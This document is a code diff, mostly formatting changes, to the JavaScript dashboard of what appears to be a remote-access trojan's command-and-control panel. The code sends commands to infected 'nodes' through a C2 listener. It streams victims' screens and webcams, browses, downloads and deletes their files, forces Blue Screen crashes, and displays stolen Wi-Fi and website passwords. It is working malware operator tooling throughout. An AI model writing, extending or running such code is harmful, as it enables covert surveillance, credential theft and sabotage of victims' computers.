@@ -48,7 +48,9 @@ document.getElementById("deviceId").addEventListener("keypress", function(e) {
 
 async function fetchData() {
     const deviceId = document.getElementById('deviceId').value.trim();
-    if (!deviceId) return showToast("Target Identifier missing.", "error");
+    if (!deviceId) {
+        return showToast("Target Identifier missing.", "error");
+    }
 
     const statusMsg = document.getElementById('statusMsg');
     const btn = document.getElementById('connectBtn');
@@ -73,9 +75,16 @@ async function fetchData() {
         const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
             headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
         });
-        if (nodeResponse.status === 401) throw new Error("Unauthorized: Password mismatch.");
-        if (nodeResponse.status === 404) throw new Error(`Device ID '${deviceId}' not found.`);
-        if (!nodeResponse.ok) throw new Error("API Error fetching node details.");
+        
+        if (nodeResponse.status === 401) {
+            throw new Error("Unauthorized: Password mismatch.");
+        }
+        if (nodeResponse.status === 404) {
+            throw new Error(`Device ID '${deviceId}' not found.`);
+        }
+        if (!nodeResponse.ok) {
+            throw new Error("API Error fetching node details.");
+        }
         
         const nodeData = await nodeResponse.json();
         
@@ -91,7 +100,10 @@ async function fetchData() {
         const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
             headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
         });
-        if (!logsResponse.ok) throw new Error("API Error fetching vault logs.");
+        
+        if (!logsResponse.ok) {
+            throw new Error("API Error fetching vault logs.");
+        }
         
         const logsData = await logsResponse.json();
         globalData = logsData;
@@ -122,7 +134,9 @@ async function fetchData() {
 // C2 COMMAND FUNCTIONS
 // ==========================================
 async function sendCommandToNode(deviceId, command) {
-    if (!deviceId) return showToast("No active node selected!", "error");
+    if (!deviceId) {
+        return showToast("No active node selected!", "error");
+    }
     
     termLog(`Sending command '${command.split(':')[0]}' to ${deviceId}...`);
     try {
@@ -134,6 +148,7 @@ async function sendCommandToNode(deviceId, command) {
             },
             body: JSON.stringify({ device_id: deviceId, command: command })
         });
+        
         if (!response.ok) {
             throw new Error(`Server responded with ${response.status}`);
         }
@@ -144,8 +159,12 @@ async function sendCommandToNode(deviceId, command) {
 }
 
 window.triggerScorchedEarth = function() {
-    if (!activeNodeId) return showToast("No active node.", "error");
+    if (!activeNodeId) {
+        return showToast("No active node.", "error");
+    }
+    
     const confirmation = prompt(`WARNING: SCORCHED EARTH PROTOCOL.\nThis will permanently remove the payload from ${activeNodeId}.\n\nType 'BURN' to confirm.`);
+    
     if (confirmation === "BURN") { 
         sendCommandToNode(activeNodeId, "SELF_DESTRUCT"); 
     } else { 
@@ -154,7 +173,10 @@ window.triggerScorchedEarth = function() {
 };
 
 window.triggerBSOD = function() {
-    if (!activeNodeId) return showToast("No active node.", "error");
+    if (!activeNodeId) {
+        return showToast("No active node.", "error");
+    }
+    
     if (confirm(`This will force a Blue Screen of Death (BSOD) on ${activeNodeId}. The target system will immediately crash.\n\nAre you sure?`)) {
         sendCommandToNode(activeNodeId, "BSOD");
     } else { 
@@ -166,8 +188,13 @@ window.triggerBSOD = function() {
 // LIVE VIEW STREAMING (HIGH SPEED)
 // ==========================================
 window.startStream = async function(type, monitorIndex = 0) {
-    if (!activeNodeId) return showToast("No active node selected!", "error");
-    if (streamInterval) stopStream(); 
+    if (!activeNodeId) {
+        return showToast("No active node selected!", "error");
+    }
+    
+    if (streamInterval) {
+        stopStream(); 
+    }
 
     activeStream.type = type;
     activeStream.monitor = monitorIndex;
@@ -209,12 +236,15 @@ window.startStream = async function(type, monitorIndex = 0) {
 };
 
 async function fetchFrame() {
-    if (!activeNodeId) return stopStream();
+    if (!activeNodeId) {
+        return stopStream();
+    }
+    
     const cacheKey = activeStream.type === 'screen' ? `screen_${activeStream.monitor}` : 'webcam';
     
     try {
         const response = await fetch(`${C2_LISTENER_URL}/frames/${activeNodeId}/${cacheKey}`, {
-            headers: { 'X-Dashboard-Password': DASHBOARD_PASSWORD }
+            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
         });
         
         if (response.ok) {
@@ -252,7 +282,10 @@ window.closeLiveView = function() {
 // FILE EXPLORER
 // ==========================================
 window.openFileSystem = function() {
-    if(!activeNodeId) return showToast("Must authenticate to node first.", "error");
+    if(!activeNodeId) {
+        return showToast("Must authenticate to node first.", "error");
+    }
+    
     const modal = document.getElementById('fileExplorerModal');
     modal.classList.remove('hidden');
     setTimeout(() => modal.classList.add('visible'), 10);
@@ -282,6 +315,7 @@ function requestDirectoryListing(path) {
     sendCommandToNode(activeNodeId, `LIST_DIR:${path}`);
 
     const pollStartTime = Date.now();
+    
     fsPollInterval = setInterval(async () => {
         if (Date.now() - pollStartTime > FS_POLL_TIMEOUT) {
             clearInterval(fsPollInterval);
@@ -298,7 +332,7 @@ function requestDirectoryListing(path) {
 
         try {
             const response = await fetch(`${C2_LISTENER_URL}/fs/${activeNodeId}`, {
-                headers: { 'X-Dashboard-Password': DASHBOARD_PASSWORD }
+                headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
             });
             
             if (response.ok) {
@@ -353,11 +387,26 @@ function renderFileSystem(data) {
         let actionButtons = '';
         if (item.type !== 'drive' && item.type !== 'inaccessible') {
             const isDir = item.type === 'directory';
+            
             if (!isDir) {
-                actionButtons += `<button class="text-cyberBlue hover:text-white mx-1" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')"><i class="fa-solid fa-download"></i></button>`;
+                actionButtons += `
+                    <button class="text-cyberBlue hover:text-white mx-1" title="Download" onclick="event.stopPropagation(); downloadFile('${fullPath}')">
+                        <i class="fa-solid fa-download"></i>
+                    </button>
+                `;
             }
-            actionButtons += `<button class="text-yellow-500 hover:text-white mx-1" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')"><i class="fa-solid fa-pen"></i></button>`;
-            actionButtons += `<button class="text-red-500 hover:text-white mx-1" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})"><i class="fa-solid fa-trash"></i></button>`;
+            
+            actionButtons += `
+                <button class="text-yellow-500 hover:text-white mx-1" title="Rename" onclick="event.stopPropagation(); renameItem('${fullPath}', '${escapeHtml(item.name.replace(/'/g, "\\'"))}')">
+                    <i class="fa-solid fa-pen"></i>
+                </button>
+            `;
+            
+            actionButtons += `
+                <button class="text-red-500 hover:text-white mx-1" title="Delete" onclick="event.stopPropagation(); deleteItem('${fullPath}', ${isDir})">
+                    <i class="fa-solid fa-trash"></i>
+                </button>
+            `;
         }
 
         switch (item.type) {
@@ -388,6 +437,7 @@ function renderFileSystem(data) {
 
         const row = document.createElement('tr');
         row.className = 'border-b border-gray-800/60 hover:bg-neon/10 transition-colors cursor-pointer';
+        
         row.innerHTML = `
             <td class="p-3 text-center ${color}" ${action}>
                 <i class="fa-regular ${icon}"></i>
@@ -405,6 +455,7 @@ function renderFileSystem(data) {
                 ${actionButtons}
             </td>
         `;
+        
         tbody.appendChild(row);
     });
 }
@@ -412,6 +463,7 @@ function renderFileSystem(data) {
 // --- FILE SYSTEM OPERATIONS (DELETE, RENAME, DOWNLAOD, UPLOAD) ---
 window.deleteItem = function(fullPath, isDir) {
     const type = isDir ? 'folder' : 'file';
+    
     if(confirm(`Are you sure you want to permanently delete this ${type}?\n\nTarget: ${fullPath}`)) {
         sendCommandToNode(activeNodeId, `DELETE:${fullPath}`);
         showToast(`Delete command sent for ${fullPath}`);
@@ -421,9 +473,11 @@ window.deleteItem = function(fullPath, isDir) {
 
 window.renameItem = function(fullPath, currentName) {
     const newName = prompt(`Enter new name for ${currentName}:`, currentName);
+    
     if(newName && newName !== currentName) {
         const dirPath = fullPath.substring(0, fullPath.lastIndexOf('\\'));
         const newPath = dirPath + '\\' + newName;
+        
         sendCommandToNode(activeNodeId, `RENAME:${fullPath}|${newPath}`);
         showToast(`Rename command sent.`);
         setTimeout(() => requestDirectoryListing(currentFsPath), 2000);
@@ -438,6 +492,7 @@ window.downloadFile = function(fullPath) {
     if (downloadPollInterval) {
         clearInterval(downloadPollInterval);
     }
+    
     const startTime = Date.now();
     
     downloadPollInterval = setInterval(async () => {
@@ -446,6 +501,7 @@ window.downloadFile = function(fullPath) {
             showToast("Download timed out or file too large.", "error");
             return;
         }
+        
         try {
             const res = await fetch(`${C2_LISTENER_URL}/fs_download/${activeNodeId}`, { 
                 headers: {'X-Dashboard-Password': DASHBOARD_PASSWORD} 
@@ -884,6 +940,7 @@ function parseToHTML(category, content) {
             let rows = blocks.map(block => {
                 let ssid = (block.match(/SSID:\s*(.*)/i) || [])[1] || 'Unknown';
                 let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
+                
                 return `
                     <tr class="border-b border-gray-800/50 hover:bg-white/5">
                         <td class="px-4 py-2.5 text-blue-400 font-bold w-1/2 break-all">${escapeHtml(ssid)}</td>
@@ -913,6 +970,7 @@ function parseToHTML(category, content) {
                 let url = (block.match(/(?:URL|HOST):\s*(.*)/i) || [])[1] || 'N/A';
                 let user = (block.match(/USER:\s*(.*)/i) || [])[1] || 'N/A';
                 let pass = (block.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
+                
                 return `
                     <tr class="border-b border-gray-800/50 hover:bg-white/5">
                         <td class="p-2 pl-3 text-yellow-400 truncate w-1/3" title="${escapeHtml(url)}">${escapeHtml(url)}</td>
@@ -942,9 +1000,11 @@ function parseToHTML(category, content) {
             const lines = content.split('\n').filter(l => l.trim().length > 0);
             let gridItems = lines.map(line => {
                 let parts = line.includes(':') ? line.split(':') : line.split('=');
+                
                 if (parts.length >= 2) {
                     let key = parts.shift().trim(); 
                     let val = parts.join(':').trim();
+                    
                     return `
                         <div class="bg-[#050810] p-2.5 rounded border border-gray-800/80">
                             <div class="text-gray-500 text-[9px] font-bold uppercase tracking-wider mb-0.5">${escapeHtml(key)}</div>
@@ -982,7 +1042,10 @@ window.copyData = function(btnElement) {
         showToast("Raw payload copied to clipboard");
         const icon = btnElement.querySelector('i');
         icon.className = "fa-solid fa-check text-green-400";
-        setTimeout(() => icon.className = "fa-regular fa-copy", 2000);
+        
+        setTimeout(() => {
+            icon.className = "fa-regular fa-copy";
+        }, 2000);
     });
 };
 
